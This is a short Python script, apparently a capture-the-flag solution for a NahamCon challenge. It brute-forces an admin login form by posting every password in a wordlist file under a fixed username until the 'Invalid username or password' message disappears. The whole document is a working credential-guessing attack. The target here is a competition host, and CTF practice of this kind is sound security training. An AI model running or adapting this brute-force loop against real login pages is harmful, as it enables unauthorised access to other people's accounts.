import requests 

URL = "http://challenge.nahamcon.com:31741"

with open('passwords.txt', 'r') as file:
    password_list = file.read().split()


def login(): 
    for xx in password_list:
        r = requests.post(
            f"{URL}/admin/login",
            data={
                "username": "UAD45s5X4Kk",
                "password": xx
            }
        )
        print(xx)
        if "Invalid username or password" not in r.text: 
            print("FIND!!!!")
            print(xx)
            break

login()